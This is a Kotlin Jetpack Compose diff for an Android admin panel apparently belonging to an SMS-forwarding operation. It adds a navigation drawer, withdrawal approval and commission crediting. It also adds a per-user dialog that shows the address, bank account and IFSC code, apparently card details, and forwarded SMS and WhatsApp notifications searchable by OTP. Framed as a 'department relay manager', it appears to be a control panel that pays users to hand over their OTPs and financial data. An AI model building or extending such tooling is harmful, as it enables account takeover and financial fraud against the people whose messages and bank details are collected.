@@ -12,25 +12,34 @@ import androidx.compose.foundation.lazy.items
 import androidx.compose.foundation.rememberScrollState
 import androidx.compose.foundation.shape.CircleShape
 import androidx.compose.foundation.shape.RoundedCornerShape
+import androidx.compose.foundation.text.KeyboardOptions
 import androidx.compose.foundation.verticalScroll
 import androidx.compose.material.icons.Icons
+import androidx.compose.material.icons.automirrored.filled.Chat
+import androidx.compose.material.icons.automirrored.filled.VolumeOff
+import androidx.compose.material.icons.automirrored.filled.VolumeUp
 import androidx.compose.material.icons.filled.*
 import androidx.compose.material3.*
 import androidx.compose.runtime.*
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.draw.clip
+import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.platform.LocalContext
+import androidx.compose.ui.platform.LocalFocusManager
 import androidx.compose.ui.text.font.FontWeight
+import androidx.compose.ui.text.input.KeyboardType
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
 import androidx.compose.ui.window.Dialog
 import androidx.compose.ui.window.DialogProperties
 import com.smsforwarder.admin.domain.model.AdminDeviceDto
 import com.smsforwarder.admin.domain.model.AdminMessageDto
+import com.smsforwarder.admin.network.WithdrawalDto
 import com.smsforwarder.admin.ui.theme.AccentGreen
 import com.smsforwarder.admin.ui.theme.PrimaryBlue
 import com.smsforwarder.admin.ui.theme.WarningAmber
+import kotlinx.coroutines.launch
 
 @OptIn(ExperimentalMaterial3Api::class)
 @Composable
@@ -39,102 +48,156 @@ fun AdminHomeScreen(
 ) {
     val state by viewModel.uiState.collectAsState()
     val context = LocalContext.current
-    var selectedTab by remember { mutableStateOf(0) } // 0: Department Users, 1: Live Stream
+    val scope = rememberCoroutineScope()
+    val drawerState = rememberDrawerState(initialValue = DrawerValue.Closed)
 
-    Scaffold(
-        topBar = {
-            TopAppBar(
-                title = {
-                    Column {
-                        Text("Central Office Admin Hub", fontWeight = FontWeight.Bold, fontSize = 18.sp)
-                        Text(
-                            "Department Phone & Notification Relay Manager",
-                            style = MaterialTheme.typography.bodySmall,
-                            color = MaterialTheme.colorScheme.onSurfaceVariant
-                        )
-                    }
-                },
-                actions = {
-                    IconButton(onClick = { viewModel.toggleSound() }) {
-                        Icon(
-                            imageVector = if (state.isSoundEnabled) Icons.Default.VolumeUp else Icons.Default.VolumeOff,
-                            contentDescription = "Toggle Sound",
-                            tint = if (state.isSoundEnabled) PrimaryBlue else MaterialTheme.colorScheme.onSurfaceVariant
-                        )
-                    }
-                    IconButton(onClick = { viewModel.fetchData(showLoading = true) }) {
-                        Icon(Icons.Default.Refresh, contentDescription = "Refresh")
-                    }
-                }
-            )
-        }
-    ) { padding ->
-        Column(
-            modifier = Modifier
-                .fillMaxSize()
-                .padding(padding)
-                .padding(horizontal = 16.dp)
-        ) {
-            // Live Status & Stat Cards Header
-            StatsHeaderCard(state = state)
+    var currentAdminSection by remember { mutableStateOf("USERS") } // "USERS", "WITHDRAWAL", "COMMISSION"
 
-            Spacer(modifier = Modifier.height(12.dp))
-
-            // Navigation Tabs (Department Users vs Live Stream)
-            TabRow(
-                selectedTabIndex = selectedTab,
-                containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f),
-                modifier = Modifier.clip(RoundedCornerShape(12.dp))
+    ModalNavigationDrawer(
+        drawerState = drawerState,
+        drawerContent = {
+            ModalDrawerSheet(
+                drawerContainerColor = MaterialTheme.colorScheme.surface,
+                modifier = Modifier.width(280.dp)
             ) {
-                Tab(
-                    selected = selectedTab == 0,
-                    onClick = { selectedTab = 0 },
-                    text = {
-                        Row(verticalAlignment = Alignment.CenterVertically) {
-                            Icon(Icons.Default.Group, contentDescription = null, modifier = Modifier.size(18.dp))
-                            Spacer(modifier = Modifier.width(6.dp))
-                            Text("Users & Phones (${state.devices.size})", fontWeight = FontWeight.Bold)
+                Column(
+                    modifier = Modifier
+                        .fillMaxSize()
+                        .padding(16.dp),
+                    verticalArrangement = Arrangement.spacedBy(12.dp)
+                ) {
+                    // Drawer Header
+                    Row(verticalAlignment = Alignment.CenterVertically) {
+                        Surface(
+                            shape = CircleShape,
+                            color = PrimaryBlue.copy(alpha = 0.15f),
+                            modifier = Modifier.size(48.dp)
+                        ) {
+                            Box(contentAlignment = Alignment.Center) {
+                                Icon(Icons.Default.AdminPanelSettings, contentDescription = null, tint = PrimaryBlue)
+                            }
+                        }
+                        Spacer(modifier = Modifier.width(12.dp))
+                        Column {
+                            Text("Admin Hub", fontWeight = FontWeight.Bold, style = MaterialTheme.typography.titleMedium)
+                            Text("Central Control Panel", style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant)
                         }
                     }
-                )
-                Tab(
-                    selected = selectedTab == 1,
-                    onClick = { selectedTab = 1 },
-                    text = {
-                        Row(verticalAlignment = Alignment.CenterVertically) {
-                            Icon(Icons.Default.FlashOn, contentDescription = null, modifier = Modifier.size(18.dp), tint = PrimaryBlue)
-                            Spacer(modifier = Modifier.width(6.dp))
-                            Text("Live Feed (${state.messages.size})", fontWeight = FontWeight.Bold)
+
+                    HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp))
+
+                    // Navigation Options
+                    NavigationDrawerItem(
+                        icon = { Icon(Icons.Default.Group, contentDescription = null) },
+                        label = { Text("Users", fontWeight = FontWeight.Bold) },
+                        selected = currentAdminSection == "USERS",
+                        onClick = {
+                            currentAdminSection = "USERS"
+                            scope.launch { drawerState.close() }
+                        }
+                    )
+
+                    NavigationDrawerItem(
+                        icon = { Icon(Icons.Default.AccountBalanceWallet, contentDescription = null) },
+                        label = { Text("Withdrawal Management", fontWeight = FontWeight.Bold) },
+                        selected = currentAdminSection == "WITHDRAWAL",
+                        onClick = {
+                            currentAdminSection = "WITHDRAWAL"
+                            scope.launch { drawerState.close() }
+                        }
+                    )
+
+                    NavigationDrawerItem(
+                        icon = { Icon(Icons.Default.MonetizationOn, contentDescription = null) },
+                        label = { Text("Commission Management", fontWeight = FontWeight.Bold) },
+                        selected = currentAdminSection == "COMMISSION",
+                        onClick = {
+                            currentAdminSection = "COMMISSION"
+                            scope.launch { drawerState.close() }
+                        }
+                    )
+                }
+            }
+        }
+    ) {
+        Scaffold(
+            topBar = {
+                TopAppBar(
+                    title = {
+                        Column {
+                            Text(
+                                text = when (currentAdminSection) {
+                                    "WITHDRAWAL" -> "Withdrawal Management"
+                                    "COMMISSION" -> "Commission Management"
+                                    else -> "Central Office Admin Hub"
+                                },
+                                fontWeight = FontWeight.Bold,
+                                fontSize = 18.sp
+                            )
+                            Text(
+                                "Department Phone & Notification Relay Manager",
+                                style = MaterialTheme.typography.bodySmall,
+                                color = MaterialTheme.colorScheme.onSurfaceVariant
+                            )
+                        }
+                    },
+                    navigationIcon = {
+                        IconButton(onClick = { scope.launch { drawerState.open() } }) {
+                            Icon(Icons.Default.MoreVert, contentDescription = "Sidebar Menu")
+                        }
+                    },
+                    actions = {
+                        IconButton(onClick = { viewModel.toggleSound() }) {
+                            Icon(
+                                imageVector = if (state.isSoundEnabled) Icons.AutoMirrored.Filled.VolumeUp else Icons.AutoMirrored.Filled.VolumeOff,
+                                contentDescription = "Toggle Sound",
+                                tint = if (state.isSoundEnabled) PrimaryBlue else MaterialTheme.colorScheme.onSurfaceVariant
+                            )
+                        }
+                        IconButton(onClick = { viewModel.fetchData(showLoading = true) }) {
+                            Icon(Icons.Default.Refresh, contentDescription = "Refresh")
                         }
                     }
                 )
             }
+        ) { padding ->
+            Column(
+                modifier = Modifier
+                    .fillMaxSize()
+                    .padding(padding)
+                    .padding(horizontal = 16.dp)
+            ) {
+                // Header Stats
+                StatsHeaderCard(state = state)
 
-            Spacer(modifier = Modifier.height(12.dp))
+                Spacer(modifier = Modifier.height(12.dp))
 
-            if (state.isLoading) {
-                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
-                    CircularProgressIndicator()
+                if (state.isLoading) {
+                    Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
+                        CircularProgressIndicator()
+                    }
+                } else {
+                    when (currentAdminSection) {
+                        "USERS" -> DepartmentUsersSection(
+                            state = state,
+                            viewModel = viewModel,
+                            onUserClick = { device -> viewModel.selectDeviceForModal(device) }
+                        )
+                        "WITHDRAWAL" -> WithdrawalManagementSection(
+                            state = state,
+                            viewModel = viewModel
+                        )
+                        "COMMISSION" -> CommissionManagementSection(
+                            state = state,
+                            viewModel = viewModel
+                        )
+                    }
                 }
-            } else if (selectedTab == 0) {
-                // DEPARTMENT USERS DIRECTORY TAB
-                DepartmentUsersSection(
-                    state = state,
-                    viewModel = viewModel,
-                    onUserClick = { device -> viewModel.selectDeviceForModal(device) }
-                )
-            } else {
-                // LIVE NOTIFICATION STREAM TAB
-                LiveNotificationsSection(
-                    state = state,
-                    viewModel = viewModel,
-                    context = context
-                )
             }
         }
     }
 
-    // Modal Dialog for Selected User's Full Details (User Details, Bank Details, Card Details, SMS History)
+    // Modal Dialog for Selected User Details & Separated Notifications
     state.selectedDeviceForModal?.let { device ->
         UserDetailModalDialog(
             device = device,
@@ -186,15 +249,15 @@ private fun StatsHeaderCard(
                 horizontalArrangement = Arrangement.spacedBy(12.dp)
             ) {
                 StatBadgeTile(
-                    title = "Registered Phones",
+                    title = "Registered Users",
                     value = "${state.devices.size}",
-                    icon = Icons.Default.Smartphone,
+                    icon = Icons.Default.Group,
                     modifier = Modifier.weight(1f)
                 )
                 StatBadgeTile(
-                    title = "Total Notifications",
-                    value = "${state.messages.size}",
-                    icon = Icons.Default.MarkChatUnread,
+                    title = "Withdrawals",
+                    value = "${state.withdrawals.size}",
+                    icon = Icons.Default.AccountBalanceWallet,
                     modifier = Modifier.weight(1f)
                 )
             }
@@ -248,7 +311,7 @@ private fun DepartmentUsersSection(
         OutlinedTextField(
             value = state.searchDeviceQuery,
             onValueChange = { viewModel.setSearchDeviceQuery(it) },
-            placeholder = { Text("Search user, mobile, or department...") },
+            placeholder = { Text("Search user by name, mobile, or ID...") },
             leadingIcon = { Icon(Icons.Default.Search, contentDescription = null) },
             singleLine = true,
             modifier = Modifier.fillMaxWidth(),
@@ -267,8 +330,7 @@ private fun DepartmentUsersSection(
                 Column(horizontalAlignment = Alignment.CenterHorizontally) {
                     Icon(Icons.Default.PhonelinkOff, contentDescription = null, modifier = Modifier.size(48.dp), tint = MaterialTheme.colorScheme.onSurfaceVariant)
                     Spacer(modifier = Modifier.height(8.dp))
-                    Text("No Department Phones Registered Yet", fontWeight = FontWeight.Bold)
-                    Text("Register user from department phone app", style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant)
+                    Text("No Users Registered Yet", fontWeight = FontWeight.Bold)
                 }
             }
         } else {
@@ -287,7 +349,7 @@ private fun DepartmentUsersSection(
                     DepartmentUserCard(
                         device = dev,
                         notificationCount = userNotiCount,
-                        onClick = { onUserClick(dev) }
+                        onViewClick = { onUserClick(dev) }
                     )
                 }
             }
@@ -299,14 +361,12 @@ private fun DepartmentUsersSection(
 private fun DepartmentUserCard(
     device: AdminDeviceDto,
     notificationCount: Int,
-    onClick: () -> Unit
+    onViewClick: () -> Unit
 ) {
     Card(
         shape = RoundedCornerShape(16.dp),
         colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)),
-        modifier = Modifier
-            .fillMaxWidth()
-            .clickable { onClick() }
+        modifier = Modifier.fillMaxWidth()
     ) {
         Column(modifier = Modifier.padding(14.dp)) {
             Row(
@@ -339,17 +399,15 @@ private fun DepartmentUserCard(
                     }
                 }
 
-                Surface(
-                    shape = RoundedCornerShape(8.dp),
-                    color = if (device.isOnline) AccentGreen.copy(alpha = 0.15f) else MaterialTheme.colorScheme.surface
+                Button(
+                    onClick = onViewClick,
+                    shape = RoundedCornerShape(10.dp),
+                    contentPadding = PaddingValues(horizontal = 12.dp, vertical = 4.dp),
+                    modifier = Modifier.height(36.dp)
                 ) {
-                    Text(
-                        text = if (device.isOnline) "ONLINE" else "OFFLINE",
-                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp),
-                        style = MaterialTheme.typography.labelSmall,
-                        fontWeight = FontWeight.Bold,
-                        color = if (device.isOnline) AccentGreen else MaterialTheme.colorScheme.onSurfaceVariant
-                    )
+                    Icon(Icons.Default.Visibility, contentDescription = null, modifier = Modifier.size(16.dp))
+                    Spacer(modifier = Modifier.width(6.dp))
+                    Text("View", fontSize = 13.sp, fontWeight = FontWeight.Bold)
                 }
             }
 
@@ -357,96 +415,465 @@ private fun DepartmentUserCard(
             HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
             Spacer(modifier = Modifier.height(10.dp))
 
-            Text(
-                text = "📍 Address: ${device.address}",
-                style = MaterialTheme.typography.bodySmall,
-                color = MaterialTheme.colorScheme.onSurfaceVariant
-            )
-
-            Spacer(modifier = Modifier.height(10.dp))
-
             Row(
                 modifier = Modifier.fillMaxWidth(),
                 horizontalArrangement = Arrangement.SpaceBetween,
                 verticalAlignment = Alignment.CenterVertically
             ) {
-                Surface(
-                    shape = RoundedCornerShape(6.dp),
-                    color = PrimaryBlue.copy(alpha = 0.12f)
-                ) {
-                    Text(
-                        text = "📩 $notificationCount Notifications",
-                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp),
-                        style = MaterialTheme.typography.labelSmall,
-                        color = PrimaryBlue,
-                        fontWeight = FontWeight.Bold
-                    )
-                }
+                Text(
+                    text = "Commission: ₹${String.format("%.2f", device.commissionEarned)}",
+                    style = MaterialTheme.typography.bodySmall,
+                    fontWeight = FontWeight.Bold,
+                    color = PrimaryBlue
+                )
 
                 Text(
-                    text = "View Full Details & History →",
-                    style = MaterialTheme.typography.labelMedium,
-                    color = PrimaryBlue,
-                    fontWeight = FontWeight.Bold
+                    text = "Notifications: $notificationCount",
+                    style = MaterialTheme.typography.bodySmall,
+                    color = MaterialTheme.colorScheme.onSurfaceVariant
                 )
             }
         }
     }
 }
 
+/**
+ * WITHDRAWAL MANAGEMENT SECTION
+ */
 @Composable
-private fun LiveNotificationsSection(
+private fun WithdrawalManagementSection(
     state: AdminHomeUiState,
-    viewModel: AdminHomeViewModel,
+    viewModel: AdminHomeViewModel
+) {
+    if (state.withdrawals.isEmpty()) {
+        Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
+            Column(horizontalAlignment = Alignment.CenterHorizontally) {
+                Icon(Icons.Default.AccountBalanceWallet, contentDescription = null, modifier = Modifier.size(48.dp), tint = MaterialTheme.colorScheme.onSurfaceVariant)
+                Spacer(modifier = Modifier.height(8.dp))
+                Text("No Withdrawal Requests", fontWeight = FontWeight.Bold)
+            }
+        }
+    } else {
+        LazyColumn(
+            modifier = Modifier.fillMaxSize(),
+            verticalArrangement = Arrangement.spacedBy(12.dp),
+            contentPadding = PaddingValues(bottom = 16.dp)
+        ) {
+            items(state.withdrawals, key = { it.withdrawalId }) { w ->
+                Card(
+                    shape = RoundedCornerShape(16.dp),
+                    colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)),
+                    modifier = Modifier.fillMaxWidth()
+                ) {
+                    Column(modifier = Modifier.padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
+                        Row(
+                            modifier = Modifier.fillMaxWidth(),
+                            horizontalArrangement = Arrangement.SpaceBetween,
+                            verticalAlignment = Alignment.CenterVertically
+                        ) {
+                            Text(w.userName, fontWeight = FontWeight.Bold, style = MaterialTheme.typography.titleMedium)
+                            Surface(
+                                shape = RoundedCornerShape(8.dp),
+                                color = when (w.status) {
+                                    "APPROVED" -> AccentGreen.copy(alpha = 0.15f)
+                                    "REJECTED" -> MaterialTheme.colorScheme.error.copy(alpha = 0.15f)
+                                    else -> WarningAmber.copy(alpha = 0.15f)
+                                }
+                            ) {
+                                Text(
+                                    text = w.status,
+                                    modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp),
+                                    fontWeight = FontWeight.Bold,
+                                    fontSize = 12.sp,
+                                    color = when (w.status) {
+                                        "APPROVED" -> AccentGreen
+                                        "REJECTED" -> MaterialTheme.colorScheme.error
+                                        else -> WarningAmber
+                                    }
+                                )
+                            }
+                        }
+
+                        HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
+
+                        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
+                            Text("Mobile: ${w.mobileNumber}", style = MaterialTheme.typography.bodyMedium)
+                            Text("Amount: ₹${String.format("%.2f", w.amount)}", fontWeight = FontWeight.Bold, color = PrimaryBlue, style = MaterialTheme.typography.titleMedium)
+                        }
+
+                        Text("Bank Name: ${w.bankName}", style = MaterialTheme.typography.bodySmall)
+                        Text("Account Number: ${w.accountNumber}", style = MaterialTheme.typography.bodySmall)
+                        Text("IFSC Code: ${w.ifscCode}", style = MaterialTheme.typography.bodySmall)
+
+                        if (w.status == "PENDING") {
+                            Spacer(modifier = Modifier.height(8.dp))
+                            Row(
+                                modifier = Modifier.fillMaxWidth(),
+                                horizontalArrangement = Arrangement.spacedBy(10.dp)
+                            ) {
+                                Button(
+                                    onClick = { viewModel.updateWithdrawal(w.withdrawalId, "APPROVED") },
+                                    colors = ButtonDefaults.buttonColors(containerColor = AccentGreen),
+                                    modifier = Modifier.weight(1f),
+                                    shape = RoundedCornerShape(10.dp)
+                                ) {
+                                    Text("Approve")
+                                }
+
+                                OutlinedButton(
+                                    onClick = { viewModel.updateWithdrawal(w.withdrawalId, "REJECTED") },
+                                    colors = ButtonDefaults.outlinedButtonColors(contentColor = MaterialTheme.colorScheme.error),
+                                    modifier = Modifier.weight(1f),
+                                    shape = RoundedCornerShape(10.dp)
+                                ) {
+                                    Text("Reject")
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+
+/**
+ * COMMISSION MANAGEMENT SECTION
+ */
+@Composable
+private fun CommissionManagementSection(
+    state: AdminHomeUiState,
+    viewModel: AdminHomeViewModel
+) {
+    var selectedUser by remember { mutableStateOf<AdminDeviceDto?>(null) }
+    var amountInput by remember { mutableStateOf("") }
+    var message by remember { mutableStateOf<String?>(null) }
+
+    val focusManager = LocalFocusManager.current
+
+    Column(
+        modifier = Modifier
+            .fillMaxSize()
+            .verticalScroll(rememberScrollState()),
+        verticalArrangement = Arrangement.spacedBy(16.dp)
+    ) {
+        Card(
+            shape = RoundedCornerShape(20.dp),
+            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)),
+            modifier = Modifier.fillMaxWidth()
+        ) {
+            Column(modifier = Modifier.padding(20.dp), verticalArrangement = Arrangement.spacedBy(14.dp)) {
+                Row(verticalAlignment = Alignment.CenterVertically) {
+                    Icon(Icons.Default.MonetizationOn, contentDescription = null, tint = PrimaryBlue, modifier = Modifier.size(28.dp))
+                    Spacer(modifier = Modifier.width(10.dp))
+                    Text("Add Commission for User", style = MaterialTheme.typography.titleLarge, fontWeight = FontWeight.Bold)
+                }
+
+                Text(
+                    text = "Select a registered user and enter commission amount. Added amount will automatically appear on user side.",
+                    style = MaterialTheme.typography.bodySmall,
+                    color = MaterialTheme.colorScheme.onSurfaceVariant
+                )
+
+                Text("Select User:", fontWeight = FontWeight.Bold)
+
+                LazyColumn(
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .height(180.dp),
+                    verticalArrangement = Arrangement.spacedBy(8.dp)
+                ) {
+                    items(state.devices, key = { it.deviceId }) { dev ->
+                        Surface(
+                            onClick = { selectedUser = dev },
+                            shape = RoundedCornerShape(12.dp),
+                            color = if (selectedUser?.deviceId == dev.deviceId) PrimaryBlue.copy(alpha = 0.15f) else MaterialTheme.colorScheme.surface,
+                            border = if (selectedUser?.deviceId == dev.deviceId) androidx.compose.foundation.BorderStroke(1.5.dp, PrimaryBlue) else null,
+                            modifier = Modifier.fillMaxWidth()
+                        ) {
+                            Row(
+                                modifier = Modifier.padding(12.dp),
+                                horizontalArrangement = Arrangement.SpaceBetween,
+                                verticalAlignment = Alignment.CenterVertically
+                            ) {
+                                Column {
+                                    Text(dev.departmentName, fontWeight = FontWeight.Bold)
+                                    Text("📞 ${dev.mobileNumber} (ID: ${dev.deviceId.take(8)})", style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant)
+                                }
+                                Text("Current: ₹${String.format("%.2f", dev.commissionEarned)}", fontWeight = FontWeight.Bold, color = PrimaryBlue)
+                            }
+                        }
+                    }
+                }
+
+                selectedUser?.let { dev ->
+                    Text("Selected User: ${dev.departmentName} (${dev.mobileNumber})", fontWeight = FontWeight.Bold, color = PrimaryBlue)
+
+                    OutlinedTextField(
+                        value = amountInput,
+                        onValueChange = { amountInput = it.filter { c -> c.isDigit() || c == '.' } },
+                        label = { Text("Commission Amount (₹)") },
+                        leadingIcon = { Icon(Icons.Default.CurrencyRupee, contentDescription = null) },
+                        keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
+                        singleLine = true,
+                        modifier = Modifier.fillMaxWidth(),
+                        shape = RoundedCornerShape(12.dp)
+                    )
+
+                    message?.let { msg ->
+                        Text(msg, color = AccentGreen, fontWeight = FontWeight.Bold, style = MaterialTheme.typography.bodyMedium)
+                    }
+
+                    Button(
+                        onClick = {
+                            focusManager.clearFocus()
+                            val amt = amountInput.toDoubleOrNull() ?: 0.0
+                            if (amt > 0) {
+                                viewModel.addCommissionToUser(dev.deviceId, amt) {
+                                    message = "✅ Added ₹$amt Commission to ${dev.departmentName}!"
+                                    amountInput = ""
+                                }
+                            }
+                        },
+                        enabled = (amountInput.toDoubleOrNull() ?: 0.0) > 0,
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .height(50.dp),
+                        shape = RoundedCornerShape(12.dp)
+                    ) {
+                        Text("Add Commission Amount", fontSize = 16.sp, fontWeight = FontWeight.Bold)
+                    }
+                }
+            }
+        }
+    }
+}
+
+/**
+ * User Full Detail Modal Dialog:
+ * Shows User Profile, Bank/Cards, and Notification History separated into Normal vs WhatsApp Notifications.
+ */
+@OptIn(ExperimentalMaterial3Api::class)
+@Composable
+private fun UserDetailModalDialog(
+    device: AdminDeviceDto,
+    allMessages: List<AdminMessageDto>,
+    searchQuery: String,
+    onSearchQueryChange: (String) -> Unit,
+    onDismiss: () -> Unit,
     context: Context
 ) {
-    val search = state.searchMessageQuery.lowercase().trim()
-    val filteredMessages = remember(state.messages, search) {
-        state.messages.filter { msg ->
-            search.isEmpty() ||
-                    msg.body.lowercase().contains(search) ||
-                    msg.sender.lowercase().contains(search) ||
-                    msg.departmentName.lowercase().contains(search) ||
-                    (msg.otp != null && msg.otp.contains(search))
+    var dialogTab by remember { mutableStateOf(0) } // 0: Details, 1: Normal Notifications, 2: WhatsApp Notifications
+
+    val search = searchQuery.lowercase().trim()
+    val userMessages = remember(allMessages, device, search) {
+        allMessages.filter { m ->
+            val isUser = m.deviceId == device.deviceId ||
+                    m.mobileNumber == device.mobileNumber ||
+                    m.departmentName.equals(device.departmentName, ignoreCase = true)
+            val matchesSearch = search.isEmpty() ||
+                    m.body.lowercase().contains(search) ||
+                    m.sender.lowercase().contains(search) ||
+                    (m.otp != null && m.otp.contains(search))
+            isUser && matchesSearch
         }
     }
 
-    Column(modifier = Modifier.fillMaxSize()) {
-        OutlinedTextField(
-            value = state.searchMessageQuery,
-            onValueChange = { viewModel.setSearchMessageQuery(it) },
-            placeholder = { Text("Search notifications, OTP, bank alerts...") },
-            leadingIcon = { Icon(Icons.Default.Search, contentDescription = null) },
-            singleLine = true,
-            modifier = Modifier.fillMaxWidth(),
-            shape = RoundedCornerShape(12.dp)
-        )
+    val normalNotifications = remember(userMessages) {
+        userMessages.filter { m -> m.category != "WHATSAPP" && !m.sender.lowercase().contains("whatsapp") }
+    }
 
-        Spacer(modifier = Modifier.height(10.dp))
+    val whatsappNotifications = remember(userMessages) {
+        userMessages.filter { m -> m.category == "WHATSAPP" || m.sender.lowercase().contains("whatsapp") }
+    }
 
-        if (filteredMessages.isEmpty()) {
-            Box(
+    Dialog(
+        onDismissRequest = onDismiss,
+        properties = DialogProperties(usePlatformDefaultWidth = false)
+    ) {
+        Surface(
+            modifier = Modifier
+                .fillMaxWidth(0.95f)
+                .fillMaxHeight(0.9f),
+            shape = RoundedCornerShape(24.dp),
+            color = MaterialTheme.colorScheme.surface
+        ) {
+            Column(
                 modifier = Modifier
-                    .fillMaxWidth()
-                    .weight(1f),
-                contentAlignment = Alignment.Center
+                    .fillMaxSize()
+                    .padding(16.dp)
             ) {
-                Column(horizontalAlignment = Alignment.CenterHorizontally) {
-                    Icon(Icons.Default.Inbox, contentDescription = null, modifier = Modifier.size(48.dp), tint = MaterialTheme.colorScheme.onSurfaceVariant)
-                    Spacer(modifier = Modifier.height(8.dp))
-                    Text("Waiting for Live Notifications...", fontWeight = FontWeight.Bold)
-                    Text("Incoming SMS from department phones will stream here live.", style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant)
+                // Header
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    horizontalArrangement = Arrangement.SpaceBetween,
+                    verticalAlignment = Alignment.CenterVertically
+                ) {
+                    Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
+                        Surface(
+                            shape = CircleShape,
+                            color = PrimaryBlue.copy(alpha = 0.15f),
+                            modifier = Modifier.size(42.dp)
+                        ) {
+                            Box(contentAlignment = Alignment.Center) {
+                                Icon(Icons.Default.Person, contentDescription = null, tint = PrimaryBlue)
+                            }
+                        }
+                        Spacer(modifier = Modifier.width(10.dp))
+                        Column {
+                            Text(
+                                text = device.departmentName,
+                                style = MaterialTheme.typography.titleMedium,
+                                fontWeight = FontWeight.Bold
+                            )
+                            Text(
+                                text = "📞 ${device.mobileNumber} | Commission: ₹${String.format("%.2f", device.commissionEarned)}",
+                                style = MaterialTheme.typography.bodySmall,
+                                color = MaterialTheme.colorScheme.onSurfaceVariant
+                            )
+                        }
+                    }
+
+                    IconButton(onClick = onDismiss) {
+                        Icon(Icons.Default.Close, contentDescription = "Close")
+                    }
+                }
+
+                Spacer(modifier = Modifier.height(12.dp))
+
+                // Dialog Tab Row (Details vs Normal Notifications vs WhatsApp Notifications)
+                ScrollableTabRow(
+                    selectedTabIndex = dialogTab,
+                    containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f),
+                    modifier = Modifier.clip(RoundedCornerShape(12.dp))
+                ) {
+                    Tab(
+                        selected = dialogTab == 0,
+                        onClick = { dialogTab = 0 },
+                        text = { Text("Details", fontWeight = FontWeight.Bold, fontSize = 13.sp) }
+                    )
+                    Tab(
+                        selected = dialogTab == 1,
+                        onClick = { dialogTab = 1 },
+                        text = {
+                            Row(verticalAlignment = Alignment.CenterVertically) {
+                                Icon(Icons.Default.Notifications, contentDescription = null, modifier = Modifier.size(16.dp))
+                                Spacer(modifier = Modifier.width(4.dp))
+                                Text("Normal (${normalNotifications.size})", fontWeight = FontWeight.Bold, fontSize = 13.sp)
+                            }
+                        }
+                    )
+                    Tab(
+                        selected = dialogTab == 2,
+                        onClick = { dialogTab = 2 },
+                        text = {
+                            Row(verticalAlignment = Alignment.CenterVertically) {
+                                Icon(Icons.AutoMirrored.Filled.Chat, contentDescription = null, tint = AccentGreen, modifier = Modifier.size(16.dp))
+                                Spacer(modifier = Modifier.width(4.dp))
+                                Text("WhatsApp (${whatsappNotifications.size})", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = AccentGreen)
+                            }
+                        }
+                    )
+                }
+
+                Spacer(modifier = Modifier.height(12.dp))
+
+                when (dialogTab) {
+                    0 -> {
+                        // TAB 0: USER DETAILS, BANK & CARDS
+                        Column(
+                            modifier = Modifier
+                                .fillMaxSize()
+                                .verticalScroll(rememberScrollState()),
+                            verticalArrangement = Arrangement.spacedBy(14.dp)
+                        ) {
+                            Card(
+                                shape = RoundedCornerShape(16.dp),
+                                colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.6f)),
+                                modifier = Modifier.fillMaxWidth()
+                            ) {
+                                Column(modifier = Modifier.padding(14.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
+                                    Text("Personal Details", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.Bold)
+                                    HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
+                                    AdminInfoRow(label = "Name", value = device.departmentName)
+                                    AdminInfoRow(label = "Mobile No", value = device.mobileNumber)
+                                    AdminInfoRow(label = "Address", value = device.address)
+                                    AdminInfoRow(label = "Commission Earned", value = "₹${String.format("%.2f", device.commissionEarned)}")
+                                }
+                            }
+
+                            Card(
+                                shape = RoundedCornerShape(16.dp),
+                                colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.6f)),
+                                modifier = Modifier.fillMaxWidth()
+                            ) {
+                                Column(modifier = Modifier.padding(14.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
+                                    Text("Bank Account Details", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.Bold)
+                                    HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
+                                    AdminInfoRowWithCopy(label = "Bank Name", value = device.bankName ?: "N/A", context = context)
+                                    AdminInfoRowWithCopy(label = "Account Number", value = device.accountNumber ?: "N/A", context = context)
+                                    AdminInfoRowWithCopy(label = "IFSC Code", value = device.ifscCode ?: "N/A", context = context)
